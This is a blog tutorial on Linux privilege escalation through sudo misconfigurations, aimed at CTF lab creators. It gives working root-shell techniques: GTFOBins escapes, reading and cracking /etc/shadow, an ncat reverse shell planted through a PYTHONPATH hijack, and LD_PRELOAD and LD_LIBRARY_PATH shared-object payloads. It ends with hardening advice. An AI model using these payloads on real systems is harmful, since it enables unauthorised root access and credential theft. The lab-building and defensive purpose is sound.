---
title: Linux Privilege Escalation - Sudo for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, sudo, noexec tag, ld_preload, ld_library_path, setenv, visudo, shell escape sequences, vulnerable sudo, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Sudo or uid 0? (?_?)"
---

# Sudo

Sudo can have various misconfigurations, which can lead to security vulnerabilities. It is a critical tool that allows authorized users to execute commands as the superuser or another specified user, in accordance with the security policy. These misconfigurations can range from having valid credentials to potential code hijacking.

Sudo permits an authorized user to execute a command as the superuser or another specified user, in accordance with the security policy. The default security policy is defined by the sudoers file, which is configured through `/etc/sudoers` or via LDAP.

The security policy dictates how a user may utilize the sudo command.

The sudoers file can be edited using the `visudo` command to ensure proper syntax and prevent errors.

## Visudo

visudo locks the sudoers file against multiple simultaneous edits, provides basic sanity checks, and checks for parse errors. If the sudoers file is currently being edited you will receive a message to try again later.

visudo parses the sudoers file after the edit and will not save the changes if there is a syntax error.

We can change the text editor for the terminal using this command:

```shell
sudo update-alternatives --config editor
```

Learn more about visudo by reading its manual:
[https://www.sudo.ws/docs/man/visudo.man/](https://www.sudo.ws/docs/man/visudo.man/)

## Sudo Syntax

The sudo syntax is the following:
-   user host=(user) command
-   user host=(user) tag: command
-   user host=(user:group) tag: command
-   user host=(user:group) tag_1:tag_2: command_1, command_2
-   %group host=(user) command
-   %group host=(user) tag: command
-   %group host=(user:group) tag: command
-   %group host=(user:group) tag_1:tag_2: command_1, command_2
 
Note: You can use ALL to specify the following: 
-   If ALL is declared in the host field, then ALL hosts will be allowed.   
-   If ALL is declared in the user field, then ALL users will be allowed.
-   If ALL is declared in the group field, then ALL groups will be allowed.
-   If ALL is declared in the tag field, it doesn't end with colons (:) and ALL commands will be allowed.

### Sudo Syntax - User Privilege Lines

Examples:

-   `root` ALL=(ALL:ALL) ALL: The rule will apply to (root).
-   root `ALL`=(ALL:ALL) ALL: This rule applies to all hosts.
-   root ALL=(`ALL`:ALL) ALL: The root user can run commands as all users.   
-   root ALL=(ALL:`ALL`) ALL: The root user can run commands as all groups.
-   root ALL=(ALL:ALL) `ALL`: This rule applies to all commands.

This means that our root user can run any command using sudo, as long as they provide their password.

### Sudo Syntax - Group Privilege Lines

Names beginning with a '%' indicate group names:
-   %admin ALL=(ALL) ALL
-   %sudo ALL=(ALL:ALL) ALL

Here, we can see that the admin group can execute any command as any user on any host. Similarly, the sudo group has the same privileges but can execute as any group as well.

## Sudo Man Page

Learn more about sudo by reading the documentation:
[https://www.sudo.ws/docs/man_all/](https://www.sudo.ws/docs/man_all/)

# Privilege Escalation via Known Passwords

If we know the current user's password we can escalate privileges by switching the root user with sudo:

```shell
user@pwn:~$ sudo su
[sudo] password for user: 
root@pwn:/home/user# whoami
root
root@pwn:/home/user# 
```

# Privilege Escalation via Sudo As Another User

We'll try to escalate from one user to another user. We will start by adding a new user to the system:

```shell
sudo adduser user --shell /bin/bash --home /home/user --gecos ''
```

Let's edit the sudo configuration file with the following command:

```shell
sudo visudo
```

Add the following configuration:

```shell
user ALL=(user:ALL) NOPASSWD: /usr/bin/perl
```

Switch to the `user`:

```shell
user@pwn:~$ su user
Password: 
```

List the sudo configuration with the option `-l` which means list:

```shell
user@pwn:/home/user$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ubuntu:
    (low : ALL) NOPASSWD: /usr/bin/perl
```

In GTFOBins, we can see how this can be abused to escalate privileges: 
![Perl Sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)

Now let's execute the program as that specific user:

```shell
user@pwn:/home/user$ sudo -u user /usr/bin/perl -e 'exec "/bin/bash";'
user@pwn:~$ whoami
user:
user@pwn:~$ 
```
The command above spawns a `bash` shell as the user.

# Privilege Escalation via Abusing Intended Functionality

Edit the sudo configuration file:

```shell
sudo visudo
```

Create the following scripts, the problem with this script is that it doesn't verify user input:

```shell
user@pwn:~$ cat /home/user/input.sh
#!/bin/bash
 

cat $1
echo "Welcome ${x}!"
```

Add the `rbash` sudo configuration:
 
```shell
user ALL=(ALL:ALL) NOPASSWD: /home/user/input.sh
```

List the sudo configuration:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (ALL : ALL) NOPASSWD: /home/user/input.sh
```

If there's a program that lets we specify its configuration (such as apache2) and prints on screen a syntax error and an invalid command, we may be able to see sensitive information:

```shell
user@pwn:~$ sudo /home/user/input.sh /etc/shadow
root:$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:18982:0:99999:7:::
daemon:*:18858:0:99999:7:::
bin:*:18858:0:99999:7:::
sys:*:18858:0:99999:7:::
```

Add this hash to a file:

```shell
user@pwn:~$ echo '$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' > hash.txt
user@pwn:~$ cat hash.txt 
$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Now we can crack the hash with a password recovery tool:

```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass123          (?)
1g 0:00:00:01 DONE (2021-12-20 18:35) 0.9345g/s 5263p/s 5263c/s 5263C/s allison1..katana
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We know the password, let's switch to the root user:

```shell
su root
```

# Privilege Escalation via NOPASSWD

Edit the sudo configuration file:

```shell
sudo visudo
```

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```shell
user:  ALL = NOPASSWD: /usr/bin/less
```

List the sudo configuration:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/less
```

Run less with sudo:

```shell
sudo /usr/bin/less /etc/shadow
```

Escape from less with:

```shell
!/bin/bash
```

Now we will have a root shell:

```shell
user@pwn:~$ sudo /usr/bin/less /etc/shadow
root@pwn:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@pwn:/home/user# whoami
root
root@pwn:/home/user# 
```

# Privilege Escalation via SETENV

This directive allows the user to **set an environment variable** while executing something:

```shell
sudo apt install ncat
```

Edit the sudo configuration file:

```shell
sudo visudo
```

The `/etc/sudoers` configuration:

```shell
user:	ALL=(ALL) SETENV: /opt/scripts/backup.py
```

List the current allowed programs and the default entries:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (ALL) SETENV: /opt/scripts/backup.py
```

Create the directory and the script:

```shell
sudo mkdir /opt/scripts && sudo vim /opt/scripts/backup.py
```

Add the following code to `/opt/scripts/backup.py`:

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/home/user/Documents'
dst = '/var/backups/user_documents'
make_archive(dst, 'gztar', src)

```

It turns out there is a path to exploit backup.py. As shown above, I can pass a $PYTHONPATH into sudo. So what is that variable? When a Python script calls import, it has a series of paths it checks for the module. I can see this with the sys module:

```shell
user@pwn:~$ python3 -c "import sys; print('\n'.join(sys.path))"

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
user@pwn:~$ 
```

The `first empty line` is **important** - it is filled at runtime with the current directory of the script (so if the current user could write to `/dev/shm`, I could exploit it that way). On this system, $PYTHONPATH is currently empty:

```shell
user@pwn:~$ echo $PYTHONPATH

user@pwn:~$ 
```

If I set it and run look at `sys.path` again, my addition is added:

```shell
user@pwn:~$ export PYTHONPATH=/tmp
user@pwn:~$ python3 -c "import sys; print('\n'.join(sys.path))"

/tmp
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

This means that Python will first try to look in the current script directory, then `/tmp`, then the Python installs to try to load `shutil`. Now we could look for writable directories.

```shell
find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'
```

Generally, we can use `/tmp` or `/dev/shm` or any other directory that we have write permissions:

```shell
vi /tmp/shutil.py
```

Set a reverse shell:

```python
import os

def make_archive(a, b, c):
	os.system("ncat 10.10.10.14 1234 -e /bin/bash")
```

Execute the `backup.py` which will import our `shutil.py` file:

```shell
sudo PYTHONPATH=/tmp python3 /opt/scripts/backup.py
```

Receive a connection as root:

```shell
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.14] from (UNKNOWN) [192.168.146.131] 47812
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

# Privilege Escalation via LD_PRELOAD

The environment variable LD_PRELOAD can be used to specify the location of a shared object (.so) file. When this option is enabled, the shared object will be loaded first. We can run code as soon as the object is loaded by building a custom shared object and an `init()` function.

Edit the `sudo` configuration file:

```shell
sudo visudo
```

This configuration file will be configured as the following:

```shell
Defaults	env_reset
Defaults env_keep+=LD_PRELOAD
```

`LD PRELOAD` will fail if the effective user ID differs from the genuine user ID. `Sudo` must use the `env_keep` option to retain the `LD PRELOAD` environment setting.

List the current allowed programs and the default entries:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Create a file (`preload.c`) 

```shell
vim ld_preload.c
```

Add the following code:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unnsetenv("LD_PRELOAD"); // The unsetenv() function deletes the variable name from the environment. If name does not exist in the environment, then the function succeeds, and the environment is unchanged.
	setresuid(0,0,0); // set SUID as root
	system("/bin/bash -p"); // spawn spawn using the SUID bit with (-p)
}
```

Compile `ld_preload.c` to `ld_preload.so`:

```shell
gcc -fPIC -shared -nostartfiles -o /tmp/ld_preload.so ld_preload.c
```

Set the `LD_PRELOAD` environment variable to the full path of the preload and run any permitted program using `sudo` as a result:

```shell
$ sudo LD_PRELOAD=/tmp/preload.so <any_allowed_program>
```

This will elevate the user to UID 0:

```shell
user@pwn:~$ sudo LD_PRELOAD=/tmp/preload.so bash 2>/dev/null
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

# Privilege Escalation via LD_LIBRARY_PATH

The LD_LIBRARY_PATH environment variable specifies which directories should be examined first for shared libraries.

Edit the sudo configuration file:

```shell
sudo visudo
```

The `/etc/sudoers` configuration:

```shell
Defaults	env_reset
Defaults env_keep+=LD_LIBRARY_PATH
```

List the current allowed programs and the default entries:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
user@pwn:~$ 
```

The `ldd` command can be used to print a program's shared libraries (.so files):

```shell
user@pwn:~$ ldd /usr/sbin/useradd
	linux-vdso.so.1 (0x00007ffd25340000)
	libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007ff9af392000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007ff9af367000)
	libsemanage.so.1 => /lib/x86_64-linux-gnu/libsemanage.so.1 (0x00007ff9af324000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff9af132000)
	libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007ff9af12a000)
	libpcre2-8.so.0 => /lib/x86_64-linux-gnu/libpcre2-8.so.0 (0x00007ff9af09a000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff9af092000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff9af3f5000)
	libsepol.so.1 => /lib/x86_64-linux-gnu/libsepol.so.1 (0x00007ff9aefe0000)
	libbz2.so.1.0 => /lib/x86_64-linux-gnu/libbz2.so.1.0 (0x00007ff9aefcd000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff9aefaa000)
```

If we construct a shared library with the same name and set LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead of the one utilized by the program.

This will require some trial and error since some shared objects are used by the program and will result in an error like this one:

```shell
vim libaudit.so.1.c
```

The following code spawns a bash with UID, GID, and EUID as 0 (root):

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile the custom shared object with the same name as the one that we want to replace:

```shell
gcc -o libaudit.so.1 -shared -fPIC libaudit.so.1.c
```

Lastly, we will change the LD_LIBRARY_PATH to our current working directory:

```shell
user@pwn:~$ sudo LD_LIBRARY_PATH=. /usr/sbin/useradd
/usr/sbin/useradd: symbol lookup error: /usr/sbin/useradd: undefined symbol: audit_open
```

Since this shared object has a function that is needed by the `/usr/sbin/useradd` binary we need to find another shared object that we can use, to do this just keep renaming our custom shared object file `libaudit.so.1.c` to names of others shared objects found with GNU linker command `ldd /usr/sbin/useradd`. After some trial and error, I found this one:

```shell
user@pwn:~$ mv libcap-ng.so.0 libpcre2-8.so.0
user@pwn:~$ sudo LD_LIBRARY_PATH=. /usr/sbin/useradd test
root@pwn:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@pwn:/home/user# 
```

The shared object is loaded and now we have a root shell.

# Privilege Escalation via Shell Escape Sequences

Edit the sudo configuration file:

```shell
sudo visudo
```

Add this to the `/etc/sudoers` configuration:

```bash
user: ALL = (root) NOPASSWD: /usr/sbin/iftop
user: ALL = (root) NOPASSWD: /usr/bin/find
<SNIP>
```

List the programs that sudo allows your user to run:

```shell
user@pwn:~$ sudo -l
Matching Defaults entries for user on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
<SNIP>
```

Visit [GTFOBins](https://gtfobins.github.io/) and search for some of the program names. If the program is listed with "sudo" as a function, we can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from `GTFOBins`.

```bash
user@pwn:~$ sudo ftp
ftp> !/bin/bash
root@pwn:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@pwn:/home/user# whoami
root
```

# Privilege Escalation via Vulnerable Sudo

It is always important to be aware that `sudo` vulnerabilities rise sometimes, here is a [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156).

# Defense via NOEXEC Tag

Edit the sudo configuration file:

```shell
sudo visudo
```

The NOEXEC option can be utilized to prevent potentially dangerous behavior in certain programs. For instance, some programs, such as `less`, can generate other commands from their interface by typing specific inputs.

```shell
low  ALL = NOEXEC: /usr/bin/less
```

Run less with sudo:

```shell
sudo /usr/bin/less /etc/shadow
```

This prevents escapes from less like:

```shell
!/bin/bash
```

# Sudo Defense

When configuring sudo, it is crucial to carefully define the policy in `/etc/sudoers`:

1. **Avoid using the `NOPASSWD` tag** unless the binary or script is not writable by others, does not take user input, or cannot be escaped with sequences.
2. **Do not use `env_keep+=LD_PRELOAD`**.
3. **Do not use `env_keep+=LD_LIBRARY_PATH`**.
4. **Avoid using the `SETENV` tag**.
5. **Ensure sudo is always up to date** with the latest version.
6. **Utilize a password vault or password manager** to securely store your passwords.
7. **Apply the `NOEXEC` tag** to binaries that can be exploited.

By following these guidelines, you can enhance the security of your sudo configuration and minimize potential vulnerabilities.